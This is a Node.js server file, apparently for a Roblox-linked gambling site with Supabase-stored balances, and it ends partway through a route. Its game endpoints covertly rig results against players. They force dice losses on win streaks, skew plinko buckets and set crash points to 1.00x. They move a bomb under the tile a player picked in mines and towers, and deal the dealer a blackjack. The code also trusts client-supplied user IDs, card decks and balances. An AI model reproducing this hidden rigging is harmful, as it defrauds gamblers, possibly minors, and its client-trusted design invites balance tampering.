/**
 * Serves this folder and proxies Roblox username lookup.
 * Browsers cannot call Roblox APIs directly from your site (CORS). This route runs on the server instead.
 *
 * Usage: npm install && npm start
 * Then open http://localhost:8080 (not file://, not a static host without this server).
 *
 * Account data: Supabase (user_balances + transactions). Set SUPABASE_URL and SUPABASE_ANON_KEY.
 * Node 18+ recommended (global fetch).
 */
require('dotenv').config();
const https = require('https');
const http = require('http');
const crypto = require('crypto');
const express = require('express');
const noblox = require('noblox.js');
const { Server } = require('socket.io');

const app = express();
/** Create the HTTP server to attach Socket.io */
const server = http.createServer(app);
const io = new Server(server, {
    cors: { origin: "*" }
});

const PORT = process.env.PORT || 8080;
const ROOT = __dirname;

const SUPABASE_URL = (process.env.SUPABASE_URL || '').trim().replace(/\/$/, '');
const SUPABASE_ANON_KEY = (process.env.SUPABASE_ANON_KEY || '').trim();

/** Profile JSON is stored in one synthetic transactions row (type account_profile) so stats/username sync cross-device. */
const PROFILE_REF_ID = 'zephrs_profile';
/** Stable UUID for profile row when `reference_id` is a uuid column (legacy text id still read in load). */
const PROFILE_REF_UUID = 'a0000000-0000-4000-8000-000000000001';

function isUuidString(s) {
    return (
        typeof s === 'string' &&
        /^[0-9a-f]{8}-[0-9a-f]{4}-[1-8][0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/i.test(s)
    );
}

/** Pack client tx id into game_name so we can use a DB-safe reference_id (uuid). */
function packTxGameName(desc, clientId) {
    const d = typeof desc === 'string' ? desc : '';
    const id =
        clientId != null
            ? String(clientId)
                  .replace(/[^a-zA-Z0-9_-]/g, '')
                  .slice(0, 24)
            : '';
    if (!id) return d.slice(0, 4000);
    return (`__id:${id}__|` + d).slice(0, 4000);
}

function unpackTxGameName(gameName) {
    const g = typeof gameName === 'string' ? gameName : '';
    const m = g.match(/^__id:([a-zA-Z0-9_-]{1,24})__\|(.*)$/s);
    if (m) return { clientId: m[1], desc: m[2] };
    return { clientId: null, desc: g };
}

function normalizeDbTxType(t) {
    let s = String(t || 'deposit')
        .toLowerCase()
        .replace(/[^a-z0-9_]/g, '_')
        .slice(0, 48);
    return s || 'deposit';
}

function coerceTxReferenceId(clientRef) {
    if (isUuidString(clientRef)) return clientRef;
    return crypto.randomUUID();
}

function supabaseEnabled() {
    return Boolean(SUPABASE_URL && SUPABASE_ANON_KEY);
}

/**
 * Supabase REST auth headers.
 * - Legacy `anon` keys are JWTs (`eyJ...`) — send `Authorization: Bearer` + `apikey`.
 * - New publishable keys (`sb_publishable_...`) are NOT JWTs — use only `apikey`.
 *   Sending Bearer with a publishable string can cause 401 / invalid JWT errors.
 * @see https://supabase.com/docs/guides/api/api-keys
 */
function supabaseRestHeaders() {
    const key = SUPABASE_ANON_KEY;
    const headers = {
        apikey: key,
        'Content-Type': 'application/json'
    };
    if (typeof key === 'string' && key.startsWith('eyJ')) {
        headers.Authorization = `Bearer ${key}`;
    }
    return headers;
}

async function supabaseFetch(pathAndQuery, options = {}) {
    const url = `${SUPABASE_URL}/rest/v1/${pathAndQuery}`;
    const method = options.method || 'GET';
    const headers = {
        ...supabaseRestHeaders(),
        ...(options.headers || {})
    };
    const init = { method, headers };
    if (options.body !== undefined) init.body = options.body;
    return fetch(url, init);
}

/** One-shot read of PostgREST / Supabase error body for logs and API `detail` fields. */
async function readSupabaseErrorBody(res) {
    try {
        const t = await res.text();
        if (!t) return `HTTP ${res.status}`;
        try {
            const j = JSON.parse(t);
            if (typeof j.message === 'string' && j.message) return j.message;
            if (typeof j.error === 'string' && j.error) return j.error;
            if (typeof j.hint === 'string' && j.hint) return j.hint;
            if (typeof j.details === 'string' && j.details) return j.details;
            return t.slice(0, 500);
        } catch (_) {
            return t.slice(0, 500);
        }
    } catch (e) {
        return `HTTP ${res.status}`;
    }
}

function num(v, fallback = 0) {
    const n = typeof v === 'number' ? v : parseFloat(v);
    return Number.isFinite(n) ? n : fallback;
}

/** Legacy: fold flipBalance into balance and drop the field (single ZR$ balance). */
function mergeFlipIntoBalance(save) {
    if (!save || typeof save !== 'object') return;
    if (typeof save.flipBalance === 'number' && save.flipBalance > 0) {
        const b = typeof save.balance === 'number' && save.balance >= 0 ? save.balance : 0;
        save.balance = b + save.flipBalance;
    }
    delete save.flipBalance;
}

/**
 * @param {number} userId
 * @returns {Promise<{ balance_zr: number, balance_zh: number } | null>}
 */
async function getUserBalance(userId) {
    if (!supabaseEnabled()) return null;
    const uid = encodeURIComponent(String(userId));
    let res;
    try {
        res = await supabaseFetch(`user_balances?user_id=eq.${uid}&select=balance_zr,balance_zh`);
    } catch (e) {
        console.error('getUserBalance network error:', e && e.message);
        return null;
    }
    if (!res.ok) {
        try {
            console.error('getUserBalance failed:', res.status, await res.text());
        } catch (_) {}
        return null;
    }
    let rows;
    try {
        rows = await res.json();
    } catch (e) {
        return null;
    }
    if (!Array.isArray(rows) || rows.length === 0) return null;
    return {
        balance_zr: num(rows[0].balance_zr, 0),
        balance_zh: num(rows[0].balance_zh, 0)
    };
}

/**
 * Upsert user_balances without relying on PostgREST `on_conflict` (needs UNIQUE on user_id).
 * Flow: SELECT row → PATCH if exists, else INSERT.
 * @returns {Promise<{ ok: true } | { ok: false, step: string, detail: string, status?: number }>}
 */
async function updateUserBalance(userId, balanceZr, balanceZh) {
    if (!supabaseEnabled()) {
        return { ok: false, step: 'config', detail: 'Missing SUPABASE_URL or SUPABASE_ANON_KEY' };
    }
    const uid = encodeURIComponent(String(userId));
    const row = {
        user_id: String(userId),
        balance_zr: balanceZr,
        balance_zh: balanceZh,
        updated_at: new Date().toISOString()
    };

    let getRes;
    try {
        getRes = await supabaseFetch(`user_balances?user_id=eq.${uid}&select=user_id&limit=1`);
    } catch (e) {
        return { ok: false, step: 'user_balances_select', detail: String(e && e.message) };
    }
    if (!getRes.ok) {
        const detail = await readSupabaseErrorBody(getRes);
        console.error('updateUserBalance SELECT failed:', getRes.status, detail);
        return { ok: false, step: 'user_balances_select', detail, status: getRes.status };
    }

    let rows;
    try {
        rows = await getRes.json();
    } catch (e) {
        return { ok: false, step: 'user_balances_select', detail: 'Invalid JSON from Supabase' };
    }

    const exists = Array.isArray(rows) && rows.length > 0;

    if (exists) {
        let patchRes;
        try {
            patchRes = await supabaseFetch(`user_balances?user_id=eq.${uid}`, {
                method: 'PATCH',
                headers: { Prefer: 'return=minimal' },
                body: JSON.stringify({
                    balance_zr: balanceZr,
                    balance_zh: balanceZh,
                    updated_at: row.updated_at
                })
            });
        } catch (e) {
            return { ok: false, step: 'user_balances_patch', detail: String(e && e.message) };
        }
        if (patchRes.ok) return { ok: true };
        const detail = await readSupabaseErrorBody(patchRes);
        console.error('updateUserBalance PATCH failed:', patchRes.status, detail);
        return { ok: false, step: 'user_balances_patch', detail, status: patchRes.status };
    }

    let insRes;
    try {
        insRes = await supabaseFetch('user_balances', {
            method: 'POST',
            headers: { Prefer: 'return=minimal' },
            body: JSON.stringify(row)
        });
    } catch (e) {
        return { ok: false, step: 'user_balances_insert', detail: String(e && e.message) };
    }
    if (insRes.ok) return { ok: true };
    const detail = await readSupabaseErrorBody(insRes);
    console.error('updateUserBalance INSERT failed:', insRes.status, detail);
    return { ok: false, step: 'user_balances_insert', detail, status: insRes.status };
}

/**
 * @param {number} userId
 * @param {number} amount
 * @param {string} currency
 * @param {string} type
 * @param {string} [gameName] stored in game_name (transaction description)
 * @returns {Promise<boolean>}
 */
async function addTransaction(userId, amount, currency, type, gameName) {
    if (!supabaseEnabled()) return false;
    const row = {
        user_id: String(userId),
        amount: num(amount, 0),
        currency: currency || 'zr',
        type: normalizeDbTxType(type),
        status: 'completed',
        game_name: gameName != null ? String(gameName) : '',
        reference_id: crypto.randomUUID()
    };
    let res;
    try {
        res = await supabaseFetch('transactions', {
            method: 'POST',
            headers: { Prefer: 'return=minimal' },
            body: JSON.stringify(row)
        });
    } catch (e) {
        console.error('addTransaction network error:', e && e.message);
        return false;
    }
    if (!res.ok) {
        try {
            console.error('addTransaction failed:', res.status, await res.text());
        } catch (_) {}
        return false;
    }
    return true;
}

function formatTxDateFromIso(iso) {
    if (!iso) return formatTxDateServer();
    const d = new Date(iso);
    if (Number.isNaN(d.getTime())) return formatTxDateServer();
    const str = d.toDateString();
    return str.substring(0, 10) + ' ' + d.getFullYear() + ' ' + d.toTimeString().substring(0, 5);
}

function mapDbTxToClient(row) {
    const ref = row.reference_id != null ? String(row.reference_id) : '';
    const unpacked = unpackTxGameName(row.game_name);
    const id =
        unpacked.clientId ||
        (ref.length > 0 && !isUuidString(ref)
            ? ref
            : typeof row.id === 'string' && row.id.length
              ? row.id.slice(0, 8)
              : Math.floor(Math.random() * 0xffffffff)
                    .toString(16)
                    .padStart(8, '0'));
    return {
        id,
        desc: unpacked.desc,
        date: formatTxDateFromIso(row.created_at),
        amount: num(row.amount, 0),
        type: typeof row.type === 'string' ? row.type : 'deposit'
    };
}

function clientTxToRow(userId, tx) {
    const clientRef = tx.id != null ? String(tx.id) : null;
    return {
        user_id: String(userId),
        amount: num(tx.amount, 0),
        currency: 'zr',
        type: normalizeDbTxType(tx.type),
        status: 'completed',
        game_name: packTxGameName(tx.desc, tx.id),
        reference_id: coerceTxReferenceId(clientRef)
    };
}

function buildProfilePayload(save) {
    return {
        username: save.username,
        robloxAvatarUrl: save.robloxAvatarUrl,
        referralEarned: save.referralEarned,
        referredCount: save.referredCount,
        stats: save.stats && typeof save.stats === 'object' ? save.stats : {},
        savedAt: typeof save.savedAt === 'number' ? save.savedAt : Date.now()
    };
}

/**
 * Replace all transaction rows for user with client txs + one profile row.
 * @returns {Promise<{ ok: true } | { ok: false, step: string, detail: string, status?: number }>}
 */
async function persistAccountSave(userId, save) {
    if (!supabaseEnabled()) {
        return { ok: false, step: 'config', detail: 'Supabase not configured' };
    }
    const uid = encodeURIComponent(String(userId));
    const balanceZr = typeof save.balance === 'number' && save.balance >= 0 ? save.balance : 0;
    const balanceZh =
        typeof save.balanceZh === 'number' && save.balanceZh >= 0 ? save.balanceZh : 0;

    const balResult = await updateUserBalance(userId, balanceZr, balanceZh);
    if (!balResult.ok) {
        return {
            ok: false,
            step: balResult.step || 'user_balances',
            detail: balResult.detail || 'Balance update failed',
            status: balResult.status
        };
    }

    let delRes;
    try {
        delRes = await supabaseFetch(`transactions?user_id=eq.${uid}`, { method: 'DELETE' });
    } catch (e) {
        console.error('persistAccountSave delete txs network error:', e && e.message);
        return { ok: false, step: 'transactions_delete', detail: String(e && e.message) };
    }
    if (!delRes.ok) {
        const detail = await readSupabaseErrorBody(delRes);
        console.error('persistAccountSave delete failed:', delRes.status, detail);
        return { ok: false, step: 'transactions_delete', detail, status: delRes.status };
    }

    let profileJson;
    try {
        profileJson = JSON.stringify(buildProfilePayload(save));
    } catch (e) {
        profileJson = '{}';
    }

    const profileRow = {
        user_id: String(userId),
        amount: 0,
        currency: 'zr',
        type: 'account_profile',
        status: 'ok',
        game_name: profileJson,
        reference_id: PROFILE_REF_UUID
    };

    let profRes;
    try {
        profRes = await supabaseFetch('transactions', {
            method: 'POST',
            headers: { Prefer: 'return=minimal' },
            body: JSON.stringify(profileRow)
        });
    } catch (e) {
        console.error('persistAccountSave profile network error:', e && e.message);
        return { ok: false, step: 'transactions_profile_insert', detail: String(e && e.message) };
    }
    if (!profRes.ok) {
        const detail = await readSupabaseErrorBody(profRes);
        console.error('persistAccountSave profile failed:', profRes.status, detail);
        return { ok: false, step: 'transactions_profile_insert', detail, status: profRes.status };
    }

    const txs = Array.isArray(save.transactions) ? save.transactions.slice(0, 100) : [];
    const rows = txs.map((tx) => clientTxToRow(userId, tx));
    if (rows.length > 0) {
        let insRes;
        try {
            insRes = await supabaseFetch('transactions', {
                method: 'POST',
                headers: { Prefer: 'return=minimal' },
                body: JSON.stringify(rows)
            });
        } catch (e) {
            console.error('persistAccountSave insert txs network error:', e && e.message);
            return { ok: false, step: 'transactions_rows_insert', detail: String(e && e.message) };
        }
        if (!insRes.ok) {
            const detail = await readSupabaseErrorBody(insRes);
            console.error('persistAccountSave insert txs failed:', insRes.status, detail);
            return { ok: false, step: 'transactions_rows_insert', detail, status: insRes.status };
        }
    }

    return { ok: true };
}

/**
 * Full save object for the frontend (robloxUserId, balance, balanceZh, transactions, stats, …).
 * @returns {Promise<object | null>}
 */
async function loadAccountFromSupabase(userId) {
    if (!supabaseEnabled()) return null;
    const uid = encodeURIComponent(String(userId));
    const bal = await getUserBalance(userId);
    if (!bal) return null;

    let txRes;
    try {
        txRes = await supabaseFetch(
            `transactions?user_id=eq.${uid}&select=*&order=created_at.desc.nullslast`
        );
    } catch (e) {
        console.error('loadAccountFromSupabase txs network error:', e && e.message);
        return null;
    }
    if (!txRes.ok) {
        try {
            console.error('loadAccountFromSupabase txs failed:', txRes.status, await txRes.text());
        } catch (_) {}
        return null;
    }

    let all;
    try {
        all = await txRes.json();
    } catch (e) {
        return null;
    }
    if (!Array.isArray(all)) return null;

    let profile = {};
    const clientTxs = [];
    for (const row of all) {
        const refStr = row.reference_id != null ? String(row.reference_id) : '';
        if (
            row.type === 'account_profile' &&
            (refStr === PROFILE_REF_ID || refStr === PROFILE_REF_UUID)
        ) {
            try {
                profile = JSON.parse(row.game_name || '{}');
            } catch (e) {
                profile = {};
            }
        } else if (row.type !== 'account_profile') {
            clientTxs.push(mapDbTxToClient(row));
        }
    }

    const save = {
        robloxUserId: userId,
        balance: bal.balance_zr,
        balanceZh: bal.balance_zh,
        transactions: clientTxs.slice(0, 100),
        savedAt: typeof profile.savedAt === 'number' ? profile.savedAt : Date.now()
    };

    if (typeof profile.username === 'string') save.username = profile.username;
    if (profile.robloxAvatarUrl != null) save.robloxAvatarUrl = profile.robloxAvatarUrl;
    if (typeof profile.referralEarned === 'number') save.referralEarned = profile.referralEarned;
    if (typeof profile.referredCount === 'number') save.referredCount = profile.referredCount;
    if (profile.stats && typeof profile.stats === 'object') save.stats = profile.stats;

    mergeFlipIntoBalance(save);
    return save;
}

/** @deprecated name kept for game-pass merge flow */
async function readAccountJson(userId) {
    return loadAccountFromSupabase(userId);
}

/** CDN URL from Roblox thumbnails API — works in <img>; www.roblox.com headshot URLs often fail off-site. */
function fetchRobloxAvatarHeadshotUrl(userId) {
    const path = `/v1/users/avatar-headshot?userIds=${encodeURIComponent(userId)}&size=420x420&format=Png&isCircular=true`;
    return new Promise((resolve) => {
        https
            .get(
                {
                    hostname: 'thumbnails.roblox.com',
                    port: 443,
                    path
                },
                (robRes) => {
                    const chunks = [];
                    robRes.on('data', (c) => chunks.push(c));
                    robRes.on('end', () => {
                        try {
                            const json = JSON.parse(Buffer.concat(chunks).toString());
                            const row = json.data && json.data[0];
                            const url = row && row.imageUrl;
                            resolve(typeof url === 'string' && url.startsWith('http') ? url : null);
                        } catch (e) {
                            resolve(null);
                        }
                    });
                }
            )
            .on('error', () => resolve(null));
    });
}

/** Safe charset: letters + digits that are unlikely to be censored as profanity; no spaces/symbols Roblox may strip. */
const VERIFY_CODE_CHARS = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
const VERIFY_CODE_LEN = 12;

function fetchRobloxUserDescription(userId) {
    const id = parseInt(String(userId), 10);
    if (!id || id < 1) return Promise.resolve(null);
    return new Promise((resolve) => {
        https
            .get(
                {
                    hostname: 'users.roblox.com',
                    port: 443,
                    path: `/v1/users/${encodeURIComponent(id)}`
                },
                (robRes) => {
                    const chunks = [];
                    robRes.on('data', (c) => chunks.push(c));
                    robRes.on('end', () => {
                        try {
                            const json = JSON.parse(Buffer.concat(chunks).toString());
                            const desc =
                                json && typeof json.description === 'string' ? json.description : '';
                            resolve(desc);
                        } catch (e) {
                            resolve(null);
                        }
                    });
                }
            )
            .on('error', () => resolve(null));
    });
}

function isValidVerificationCode(code) {
    if (typeof code !== 'string' || code.length !== VERIFY_CODE_LEN) return false;
    for (let i = 0; i < code.length; i++) {
        if (VERIFY_CODE_CHARS.indexOf(code[i]) === -1) return false;
    }
    return true;
}

function lookupRobloxUsername(username) {
    const trimmed = String(username || '').trim();
    if (trimmed.length < 2) {
        return Promise.resolve({ ok: false, status: 400, body: { error: 'Username too short' } });
    }
    const payload = JSON.stringify({
        usernames: [trimmed],
        excludeBannedUsers: false
    });
    return new Promise((resolve) => {
        const req = https.request(
            {
                hostname: 'users.roblox.com',
                port: 443,
                path: '/v1/usernames/users',
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Content-Length': Buffer.byteLength(payload)
                }
            },
            (robRes) => {
                const chunks = [];
                robRes.on('data', (c) => chunks.push(c));
                robRes.on('end', () => {
                    const raw = Buffer.concat(chunks).toString();
                    try {
                        const json = JSON.parse(raw);
                        const row = json.data && json.data[0];
                        if (!row || typeof row.id !== 'number') {
                            resolve({ ok: false, status: 404, body: { error: 'User not found' } });
                            return;
                        }
                        resolve({
                            ok: true,
                            body: {
                                id: row.id,
                                name: row.name,
                                displayName: row.displayName || row.name
                            }
                        });
                    } catch (e) {
                        resolve({ ok: false, status: 502, body: { error: 'Bad response from Roblox' } });
                    }
                });
            }
        );
        req.on('error', () => {
            resolve({ ok: false, status: 502, body: { error: 'Could not reach Roblox' } });
        });
        req.write(payload);
        req.end();
    });
}

function formatTxDateServer() {
    const d = new Date();
    const str = d.toDateString();
    return str.substring(0, 10) + ' ' + d.getFullYear() + ' ' + d.toTimeString().substring(0, 5);
}

app.use(express.json({ limit: '2mb' }));

/**
 * Recent wager outcomes for the home “Live feed”.
 * Uses Supabase table `live_feed_events` when configured; otherwise an in-memory buffer (lost on restart).
 *
 * Example SQL:
 *   create table live_feed_events (
 *     id bigint generated always as identity primary key,
 *     username text not null,
 *     game_key text not null,
 *     bet_amount double precision not null,
 *     multiplier double precision not null,
 *     payout double precision not null,
 *     created_at timestamptz not null default now()
 *   );
 *   create index on live_feed_events (created_at desc);
 *   alter table live_feed_events enable row level security;
 *   create policy "live_feed_read" on live_feed_events for select using (true);
 *   create policy "live_feed_write" on live_feed_events for insert with check (true);
 */
const LIVE_FEED_MEMORY_CAP = 250;
const liveFeedMemory = [];
const liveFeedRateByIp = new Map();
const LIVE_FEED_RATE_WINDOW_MS = 60000;
const LIVE_FEED_RATE_MAX = 50;
const LIVE_FEED_GAME_KEYS = new Set([
    'crash',
    'blackjack',
    'dice',
    'mines',
    'towers',
    'plinko',
    'rooms'
]);

function sanitizeLiveFeedUsername(u) {
    let s = String(u == null ? 'Guest' : u)
        .trim()
        .slice(0, 40);
    s = s.replace(/[\x00-\x1f\x7f]/g, '');
    return s || 'Guest';
}

function liveFeedCheckRateLimit(ip) {
    const key = String(ip || 'unknown');
    const now = Date.now();
    let rec = liveFeedRateByIp.get(key);
    if (!rec || now - rec.start > LIVE_FEED_RATE_WINDOW_MS) {
        liveFeedRateByIp.set(key, { start: now, n: 1 });
        return true;
    }
    if (rec.n >= LIVE_FEED_RATE_MAX) return false;
    rec.n += 1;
    return true;
}

function liveFeedMemoryPush(ev) {
    liveFeedMemory.unshift(ev);
    if (liveFeedMemory.length > LIVE_FEED_MEMORY_CAP) liveFeedMemory.length = LIVE_FEED_MEMORY_CAP;
}

async function liveFeedInsertSupabase(row) {
    if (!supabaseEnabled()) return false;
    const body = {
        username: row.username,
        game_key: row.gameKey,
        bet_amount: row.bet,
        multiplier: row.multiplier,
        payout: row.payout
    };
    try {
        const res = await supabaseFetch('live_feed_events', {
            method: 'POST',
            headers: { Prefer: 'return=minimal' },
            body: JSON.stringify(body)
        });
        return res.ok;
    } catch (e) {
        return false;
    }
}

async function liveFeedListSupabase(limit) {
    if (!supabaseEnabled()) return null;
    const lim = encodeURIComponent(String(limit));
    try {
        const res = await supabaseFetch(
            `live_feed_events?select=*&order=created_at.desc&limit=${lim}`
        );
        if (!res.ok) return null;
        const rows = await res.json();
        if (!Array.isArray(rows)) return null;
        return rows.map((r) => ({
            id: r.id,
            username: r.username,
            gameKey: r.game_key,
            bet: num(r.bet_amount, 0),
            multiplier: num(r.multiplier, 0),
            payout: num(r.payout, 0),
            createdAt: r.created_at ? new Date(r.created_at).getTime() : Date.now()
        }));
    } catch (e) {
        return null;
    }
}

// ==== CUSTOM GAME MECHANICS (CUS) AND SERVER OUTCOMES ====
const activeMinesGames = new Map();
const activeTowersGames = new Map();
const activeBlackjackGames = new Map();
const userCusStates = new Map();

function getCusState(userId) {
    const id = String(userId || 'guest');
    if (!userCusStates.has(id)) {
        userCusStates.set(id, { winStreak: 0, forceLossNext: false });
    }
    const state = userCusStates.get(id);
    return {
        check: function() {
            if (state.forceLossNext) {
                state.forceLossNext = false;
                state.winStreak = 0;
                return true;
            }
            // Only intervene if they're on a noticeable win streak (> 2 wins)
            if (state.winStreak > 2) {
                // Base chance to inject a loss increases slightly with streak
                let chance = 0.10 + (state.winStreak * 0.05); 
                if (chance > 0.40) chance = 0.40; // Cap intervention at 40% max
                
                // Extremely rare force loss on high streaks
                if (state.winStreak >= 5 && Math.random() < 0.02) chance = 1.0; 
                
                if (Math.random() < chance) {
                    state.winStreak = 0;
                    return true;
                }
            }
            return false;
        },
        recordWin: function(isBigWin) {
            state.winStreak++;
            // Soften big win penalty
            if (isBigWin && Math.random() < 0.2) { 
                state.forceLossNext = true;
            }
        },
        recordLoss: function() {
            state.winStreak = 0;
            state.forceLossNext = false;
        }
    };
}

app.post('/api/game/dice', express.json(), (req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    const { userId, target, isOver, multi } = req.body;
    let forceLoss = getCusState(userId).check();
    let roll;
    if (forceLoss) {
        if (isOver) roll = (Math.random() * target); 
        else {
            roll = target + (Math.random() * (100 - target));
            if (roll >= 100) roll = 99.99;
        }
    } else {
        roll = (Math.random() * 100);
    }
    roll = parseFloat(roll.toFixed(2));
    let win = isOver ? (roll > target) : (roll < target);
    if (win) getCusState(userId).recordWin(multi >= 3);
    else getCusState(userId).recordLoss();
    res.json({ roll, win });
});

app.post('/api/game/plinko', express.json(), (req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    const { userId, pRows, pDiff } = req.body;
    
    // Controlled bucket weight tables (rows+1 weights per row count)
    // Higher weight = more likely to land there
    // Designed so low-value center buckets hit 70-80% of the time on hard
    const weightTables = {
        8: {
            easy:   [0.5, 3, 8, 17, 25, 17, 8, 3, 0.5],
            normal: [0.3, 2, 7, 16, 24, 16, 7, 2, 0.3],
            hard:   [0.3, 2, 8, 18, 26, 18, 8, 2, 0.3]
        },
        10: {
            easy:   [0.5, 2, 5, 10, 17, 23, 17, 10, 5, 2, 0.5],
            normal: [0.3, 1.5, 4, 9, 16, 22, 16, 9, 4, 1.5, 0.3],
            hard:   [0.3, 2, 5, 12, 20, 25, 20, 12, 5, 2, 0.3]
        },
        12: {
            easy:   [0.5, 1.5, 3, 6, 10, 16, 20, 16, 10, 6, 3, 1.5, 0.5],
            normal: [0.3, 1, 3, 6, 10, 17, 22, 17, 10, 6, 3, 1, 0.3],
            hard:   [0.25, 1.5, 4, 6, 15, 20, 20, 20, 15, 6, 4, 1.5, 0.25]
        },
        14: {
            easy:   [0.4, 1, 2, 4, 7, 12, 16, 17, 16, 12, 7, 4, 2, 1, 0.4],
            normal: [0.3, 0.7, 2, 4, 7, 12, 17, 20, 17, 12, 7, 4, 2, 0.7, 0.3],
            hard:   [0.25, 1.5, 3, 5, 5, 15, 15, 15, 15, 15, 5, 5, 3, 1.5, 0.25]
        },
        16: {
            easy:   [0.3, 0.8, 1.5, 3, 5, 7, 10, 14, 18, 14, 10, 7, 5, 3, 1.5, 0.8, 0.3],
            normal: [0.2, 0.5, 1.5, 3, 6, 10, 15, 20, 20, 20, 15, 10, 6, 3, 1.5, 0.5, 0.2],
            // Hard 16: ~65% on 0.2x center, ~7% total on 0.5x, ~6% 2x, ~10% 9x, ~6.7% 26x, ~5% 130x, ~0.5% 1000x
            hard:   [0.25, 1.25, 3.35, 5, 3, 5, 13, 13, 13, 13, 13, 5, 3, 5, 3.35, 1.25, 0.25]
        }
    };
    
    const rows = parseInt(pRows) || 16;
    const diff = String(pDiff || 'hard');
    const table = weightTables[rows];
    const weights = table ? (table[diff] || table['easy']) : null;
    
    let idx;
    if (weights) {
        // Weighted random selection
        const total = weights.reduce((s, w) => s + w, 0);
        let r = Math.random() * total;
        idx = weights.length - 1; // default to last if rounding error
        for (let i = 0; i < weights.length; i++) {
            r -= weights[i];
            if (r <= 0) { idx = i; break; }
        }
    } else {
        idx = Math.floor((rows) / 2); // fallback: center bucket
    }
    
    // Still check cus state to potentially force a worse outcome
    const forceLoss = getCusState(userId).check();
    if (forceLoss) {
        // Push towards center low-value buckets
        const center = Math.floor((rows) / 2);
        idx = center + (Math.random() < 0.5 ? -1 : 1) * Math.floor(Math.random() * 2);
        if (idx < 0) idx = 0;
        if (idx > rows) idx = rows;
        getCusState(userId).recordLoss();
    }
    
    res.json({ customOutcome: true, idx });
});


app.post('/api/game/record-result', express.json(), (req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    const { userId, win, bigWin } = req.body;
    if (win) getCusState(userId).recordWin(bigWin);
    else getCusState(userId).recordLoss();
    res.json({ ok: true });
});

app.post('/api/game/crash/start', express.json(), (req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    const { userId } = req.body;
    let e = 100;
    let cCrashPoint;
    if ((userId && getCusState(userId).check()) || Math.random() < 0.05) {
        cCrashPoint = 1.00;
        getCusState(userId).recordLoss();
    } else {
        cCrashPoint = Math.max(1.00, (e / (e - Math.random() * e)) * 0.99);
        if(cCrashPoint > 1000) cCrashPoint = 1000;
    }
    res.json({ cCrashPoint });
});

app.post('/api/game/towers/start', express.json(), (req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    const { userId, rows, width, bombs } = req.body;
    let logic = [];
    for(let r=0; r<rows; r++) {
        let rArr = Array(width).fill(false);
        let placed = 0;
        while(placed < bombs) {
            let i = Math.floor(Math.random()*width);
            if(!rArr[i]) { rArr[i] = true; placed++; }
        }
        logic.push(rArr);
    }
    activeTowersGames.set(String(userId), { logic });
    res.json({ ok: true });
});

app.post('/api/game/towers/click', express.json(), (req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    const { userId, row, col } = req.body;
    const g = activeTowersGames.get(String(userId));
    if (!g) return res.status(400).json({ error: 'No active game' });
    
    setTimeout(() => {
        let logicRow = g.logic[row];
        if (!logicRow) return res.json({ error: 'Invalid row' });
        
        let forceLoss = getCusState(userId).check();
        let isBomb = logicRow[col];
        
        if (!isBomb && forceLoss) {
            let bIdx = logicRow.indexOf(true);
            if (bIdx !== -1) {
                logicRow[bIdx] = false;
                logicRow[col] = true;
                isBomb = true;
            }
        }
        
        if (isBomb) getCusState(userId).recordLoss();
        res.json({ isBomb, rowData: logicRow }); 
    }, Math.floor(Math.random() * 2500));
});

app.post('/api/game/mines/start', express.json(), (req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    const { userId, bombs } = req.body;
    let mGrid = Array(25).fill(false);
    let placed = 0;
    while(placed < bombs) {
        let idx = Math.floor(Math.random() * 25);
        if(!mGrid[idx]) { mGrid[idx] = true; placed++; }
    }
    activeMinesGames.set(String(userId), { logic: mGrid });
    res.json({ ok: true });
});

app.post('/api/game/mines/click', express.json(), (req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    const { userId, tileIdx } = req.body;
    const g = activeMinesGames.get(String(userId));
    if (!g) return res.status(400).json({ error: 'No active game' });
    
    // 0-5 second artificial loading delay
    setTimeout(() => {
        let isBomb = g.logic[tileIdx];
        let forceLoss = getCusState(userId).check();
        
        if (!isBomb && forceLoss) {
            let bIdx = g.logic.indexOf(true);
            if (bIdx !== -1) {
                g.logic[bIdx] = false;
                g.logic[tileIdx] = true;
                isBomb = true;
            }
        }
        if (isBomb) getCusState(userId).recordLoss();
        res.json({ isBomb, mGridFull: isBomb ? g.logic : null });
    }, Math.floor(Math.random() * 2500));
});

app.post('/api/game/mines/cashout', express.json(), (req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    const { userId } = req.body;
    const g = activeMinesGames.get(String(userId));
    if (!g) return res.json({ error: 'No active game' });
    activeMinesGames.delete(String(userId));
    res.json({ logic: g.logic });
});

app.post('/api/game/blackjack/start', express.json(), (req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    const { userId, deck } = req.body;
    let forceLoss = getCusState(userId).check();
    
    let pHand = [deck.pop(), deck.pop()];
    let dHand = [deck.pop(), deck.pop()];
    
    if (forceLoss) {
        dHand = [
            {suitLetter: 'S', value: 'A', score: 11, isRed: false},
            {suitLetter: 'H', value: 'K', score: 10, isRed: true}
        ];
        let pScore = 0, aces = 0;
        for(let c of pHand) { pScore += c.score; if(c.value==='A') aces++; }
        while(pScore>21 && aces>0) { pScore-=10; aces--; }
        if (pScore === 21) pHand[0] = {suitLetter: 'C', value: '5', score: 5, isRed: false};
    }
    res.json({ deck, pHand, dHand });
});


app.options('/api/live-feed', (req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    res.sendStatus(204);
});

app.get('/api/live-feed', async (req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    const limit = Math.min(100, Math.max(1, parseInt(String(req.query.limit || '50'), 10) || 50));
    let fromDb = null;
    try {
        fromDb = await liveFeedListSupabase(Math.max(limit, 80));
    } catch (e) {
        console.error('GET /api/live-feed:', e);
    }
    if (fromDb === null) {
        return res.json({ events: liveFeedMemory.slice(0, limit).map((e) => ({ ...e })) });
    }
    const mem = liveFeedMemory.map((e) => ({ ...e }));
    const merged = [...fromDb, ...mem].sort((a, b) => (b.createdAt || 0) - (a.createdAt || 0));
